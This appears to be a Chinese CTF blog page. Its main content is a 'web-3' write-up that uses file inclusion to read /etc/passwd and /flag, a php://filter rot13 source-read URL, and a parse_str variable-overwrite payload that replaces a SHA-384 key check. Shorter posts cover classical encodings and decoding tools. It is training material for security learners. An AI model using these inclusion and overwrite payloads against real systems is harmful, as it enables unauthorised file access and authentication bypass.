<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211018194117.png" alt="img" style="zoom:67%;">

<h2 id="web-3"><a href="#web-3" class="headerlink" title="web-3"></a>web-3</h2><p>题目地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">172.31.65.175</span><br></pre></td></tr></table></figure>

<p>搜寻信息，查看一下页面源码，发现有一个index.php<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211018194509.png" alt="img" style="zoom:67%;"><br>点进去以后继续查看源码，发现有个参数?page=index，查看的是文件，所以试试是不是任意文件读取（文件包含）</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211018194617.png" alt="img" style="zoom:67%;">

<p>发现可以读到/etc/passwd<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211018194833.png" alt="img" style="zoom: 67%;"></p>
<h3 id="非预期解："><a href="#非预期解：" class="headerlink" title="非预期解："></a>非预期解：</h3><p>大多数情况下，文件读取的题目，flag都会在根目录下，所以直接读取就好了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211018195056.png" alt="img" style="zoom:67%;">

<h3 id="预期解："><a href="#预期解：" class="headerlink" title="预期解："></a>预期解：</h3><p>预期解的话，肯定是要先读一下源码，所以需要配合php伪协议进行源码的读取</p>
<p>试了几个，发现使用rot13编码就可以了，但是现在代码也读不了，需要使用rot13解码(不过这题直接给了rot13这个编码，…..)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.87.183&#x2F;index.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.rot13&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211018195624.png" alt="img" style="zoom:67%;">

<p>然后来审一下源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$page = $_get[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($page)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/^.+base.+$/&quot;</span>,$page)) &#123;<span class="comment">#说明过滤了base</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot;text-align:center&quot;</span>&gt;</span><br><span class="line">    &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die(&quot;&lt;/br&gt;not base&quot;);?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-align:center&quot;</span>&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($page === <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">include</span>($page);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        &#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $hashed_key = <span class="string">&#x27;df01c5786c5d7d83211a8f5f22f6bdb8468e23494ad698cb86c02d128473beef765952cdd5504cbe4657a6334f6b4f7b&#x27;</span>;</span><br><span class="line">    $parsed = parse_url($_server[<span class="string">&#x27;request_uri&#x27;</span>]);</span><br><span class="line">    $query = $parsed[<span class="string">&quot;query&quot;</span>];</span><br><span class="line">    $parsed_query = parse_str($query);<span class="comment">#存在变量覆盖</span></span><br><span class="line">    <span class="keyword">if</span>($parsed_query!=<span class="literal">null</span>)&#123;</span><br><span class="line">        $action = $parsed_query[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($action===<span class="string">&quot;auth&quot;</span>)&#123;</span><br><span class="line">        $key = $_get[<span class="string">&quot;key&quot;</span>];</span><br><span class="line">        $hashed_input = hash(<span class="string">&#x27;sha384&#x27;</span>, $key);<span class="comment">#使用sha384加密key</span></span><br><span class="line">        <span class="comment">//echo $hashed_input.&#x27;\n&#x27;;</span></span><br><span class="line">        <span class="keyword">if</span>($hashed_input!==$hashed_key)&#123;<span class="comment">#sha384加密以后的key要等于本来的hashed_key</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no way to get flag!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p><strong>思路：</strong>通过变量覆盖，将hash_key变量覆盖为我们可控的key</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parse_url()将url解析后，返回一个关联数组，数组中包含query这个字段，用来存储传入的参数值</span><br><span class="line">parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量</span><br></pre></td></tr></table></figure>

<p>写个简单的脚本debug一下让大家看看原理吧</p>
<p>本地复现源码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$hashed_key = <span class="string">&#x27;df01c5786c5d7d83211a8f5f22f6bdb8468e23494ad698cb86c02d128473beef765952cdd5504cbe4657a6334f6b4f7b&#x27;</span>;</span><br><span class="line">$parsed = parse_url($_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">$query = $parsed[<span class="string">&quot;query&quot;</span>];</span><br><span class="line">$parsed_query = parse_str($query);</span><br><span class="line"><span class="keyword">print</span>($hashed_key);</span><br></pre></td></tr></table></figure>

<p>首先我传入这个值<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211018201755.png" alt="img" style="zoom:67%;"></p>
<p>然后我们到phpstorm里面去跟进一下:可以看到我们传入的hashed_key=123是数组中query键的值<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211018201909.png" alt="img" style="zoom:67%;"></p>
<p>经过parse_str函数的转化后hashed_key从一开始的那一大串东西被重新赋值为123了，产生了变量覆盖漏洞<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211018202030.png" alt="img" style="zoom:67%;"></p>
<p>所以，根据这个漏洞，我们可以随便传入一个1经过sha加密以后对hash_进行变量覆盖，然后这个是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?action&#x3D;auth&amp;key&#x3D;1&amp;hashed_key&#x3D;47f05d367b0c32e438fb63e6cf4a5f35c2aa2f90dc7543f8a41a0f95ce8a40a313ab5cf36134a2068c4c969cb50db776</span><br></pre></td></tr></table></figure>

<p>即可拿到flag</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/15/crypto-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/">crypto-古典密码</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-15</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/14/crypto/">crypto-编码</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-14</time><div class="content"><h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><h2 id="ascii码"><a href="#ascii码" class="headerlink" title="ascii码"></a>ascii码</h2><h2 id="hex编码"><a href="#hex编码" class="headerlink" title="hex编码"></a>hex编码</h2><p>信息转为十六进制</p>
<h2 id="base家族"><a href="#base家族" class="headerlink" title="base家族"></a>base家族</h2><p>ase64 用于编码邮件内容、网页图片，意在减少传输过程中可能出现的错误；Base58 是比特币地址使用的编码方法，旨在提高地址的辨识度；Base32 用在一些对大小写不敏感的文件系统中。每种 Base-x 的编码都有适合它们的应用场景。</p>
<p>Base编码从底层来说就是对数据进行进制转换，Base64是64进制，Base32是32进制，Base16是16进制。而中间的过程是为了更好地进行传输数据</p>
<h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><h2 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h2><h2 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h2><h2 id="Morse电码"><a href="#Morse电码" class="headerlink" title="Morse电码"></a>Morse电码</h2><h2 id="JSFuck"><a href="#JSFuck" class="headerlink" title="JSFuck"></a>JSFuck</h2><p>只需要“()+[]!”这6个字符组成的字符串。jsfuck的编码和解码与morsecode类似，只不过其表示的是<code>JavaScript</code>的语句。jsfuck源于一门编程语言brainfuck，其主要的思想就是只使用8种特定的符号来编写代码。jsfuck也是沿用了这个思想，它仅仅使用6种符号来编写代码。它们分别是<code>()+[]!</code></p>
<p>JSFuck可以使用jsfuck官方的网站进行解密：<a target="_blank" rel="noopener" href="http://www.jsfuck.com/">JSFuck - Write any JavaScript with 6 Characters: !+</a></p>
<h2 id="Quoted-Printable编码"><a href="#Quoted-Printable编码" class="headerlink" title="Quoted-Printable编码"></a>Quoted-Printable编码</h2><p>比如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">密码学</span><br></pre></td></tr></table></figure>

<p>可以使用Quoted-printable编码为：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">=E5=AF=86=E7=A0=81=E5=AD=A6=0A=09=09=09=09=09</span><br></pre></td></tr></table></figure>

<p>Quoted-printable的编码形式也比较容易辨认，基本上就是字符加等于号构成编码文段格式。</p>
<h2 id="BrainFuck编码"><a href="#BrainFuck编码" class="headerlink" title="BrainFuck编码"></a>BrainFuck编码</h2><p>比如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Hello world!</span><br></pre></td></tr></table></figure>

<p>使用BrainFuck进行编码就会得到</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +++++ .&lt;+++ ++[-&gt; +++++ &lt;]&gt;++ ++.++ +++++</span><br><span class="line"></span><br><span class="line">..+++ .&lt;+++ +++++ [-&gt;-- ----- -&lt;]&gt;- ----- ----- ----. &lt;++++ +++[- &gt;++++</span><br><span class="line"></span><br><span class="line">+++&lt;] &gt;++++ ++.&lt;+ +++[- &gt;++++ &lt;]&gt;++ +++++ +.+++ .---- --.-- ----- -.&lt;++</span><br><span class="line"></span><br><span class="line">+++++ +[-&gt;- ----- --&lt;]&gt; ---.&lt; </span><br></pre></td></tr></table></figure>

<p>可以使用<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">Brainfuck/Ook! Obfuscation/Encoding</a> 这个网站进行编码和解码</p>
<h2 id="Ook编码"><a href="#Ook编码" class="headerlink" title="Ook编码"></a>Ook编码</h2><p>Ook也是一种小型的编程语言，Ook是为红毛猩猩设计的编程语言，设计思路和BrainFuck的设计思路基本类似，但是Ook采用了更少的元素进行编程，语句更加简单。由于Ook的特点，因此Ook也可以设计为一种特殊的编码方式。</p>
<p>比如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Hello world!</span><br></pre></td></tr></table></figure>

<p>使用Ook编码后，得到</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line"></span><br><span class="line">Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook! Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line"></span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!</span><br><span class="line"></span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line"></span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook.</span><br><span class="line"></span><br><span class="line">Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?</span><br><span class="line"></span><br><span class="line">Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line"></span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.</span><br><span class="line"></span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook!</span><br><span class="line"></span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line"></span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line"></span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook?</span><br><span class="line"></span><br><span class="line">Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. </span><br></pre></td></tr></table></figure>

<p>非常长，进行Ook编码和解码的网站也是<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">Brainfuck/Ook! Obfuscation/Encoding</a></p>
<h2 id="UUencode编码"><a href="#UUencode编码" class="headerlink" title="UUencode编码"></a>UUencode编码</h2><p>比如</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Hello World!</span><br></pre></td></tr></table></figure>

<p>进行编码后得到：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">,2&amp;5L;&amp;\@5V]R;&amp;0A</span><br></pre></td></tr></table></figure>

<h2 id="XXencode编码"><a href="#XXencode编码" class="headerlink" title="XXencode编码"></a>XXencode编码</h2><p>比如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Hello World!</span><br></pre></td></tr></table></figure>

<p>进行XXencode编码后，得到</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">BG4JgP4wUJqxmP4EV0U++</span><br></pre></td></tr></table></figure>

<h2 id="JJencode编码"><a href="#JJencode编码" class="headerlink" title="JJencode编码"></a>JJencode编码</h2><p>算是JSFuck编码的前身，是由18种字符组成的编码格式。是针对JavaScript进行设计的编码方式。</p>
<p>长谷川阳介（Yosuke Hasegawa）于2009年7月创建了一个名为“jjencode”的网络应用程序，可将一切的JavaScript代码混淆为!+,”$.:;_{}~=这十八个字符的排列组合。</p>
<p>比如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">alert(&quot;Hello, JavaScript&quot; )</span><br></pre></td></tr></table></figure>

<p>进行jjencode编码，得到</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">$=~[];$=&#123;___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:(&#123;&#125;+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(\\\&quot;\\&quot;+$.__$+$.__$+$.___+$.$$$_+(![]+&quot;&quot;)[$._$_]+(![]+&quot;&quot;)[$._$_]+$._$+&quot;,\\&quot;+$.$__+$.___+&quot;\\&quot;+$.__$+$.__$+$._$_+$.$_$_+&quot;\\&quot;+$.__$+$.$$_+$.$$_+$.$_$_+&quot;\\&quot;+$.__$+$._$_+$._$$+$.$$__+&quot;\\&quot;+$.__$+$.$$_+$._$_+&quot;\\&quot;+$.__$+$.$_$+$.__$+&quot;\\&quot;+$.__$+$.$$_+$.___+$.__+&quot;\\\&quot;\\&quot;+$.$__+$.___+&quot;)&quot;+&quot;\&quot;&quot;)())();</span><br></pre></td></tr></table></figure>

<h2 id="AAencode编码"><a href="#AAencode编码" class="headerlink" title="AAencode编码"></a>AAencode编码</h2><p>aaencode编码是一个比较有意思的编码形式，同样也是对于JavaScript语言设计的编码方式，是把JavaScript的代码编码成日本的表情包。</p>
<p>比如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">alert(&quot;Hello, JavaScript&quot;)</span><br></pre></td></tr></table></figure>

<p>通过aaencode编码，得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] &#x3D;(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ&#x3D;(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)&#x3D;(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]&#x3D;&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/14/misc%E7%BD%91%E7%AB%99/">misc网站</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-14</time><div class="content"><p>brainfuck加密:<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br>base64解码后可以直接转文件:<a target="_blank" rel="noopener" href="https://the-x.cn/base64">https://the-x.cn/base64</a><br>bugku解密网站:<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tools.html">https://ctf.bugku.com/tools.html</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/13/NSSCTF-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">NSSCTF-phar反序列化</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-13</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/13/buu-missc/">buu-misc</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-13</time><div class="content"><p>忘记保存了，无语了，所以直接写一下解题思路</p>
<h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><p>选择analyze的frame browser</p>
<h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e 1.png</span><br></pre></td></tr></table></figure>

<p>只用zip密码爆破软件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013102808.png" alt="img" style="zoom:67%;"><br> <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013103515.png" alt="img" style="zoom:67%;"></p>
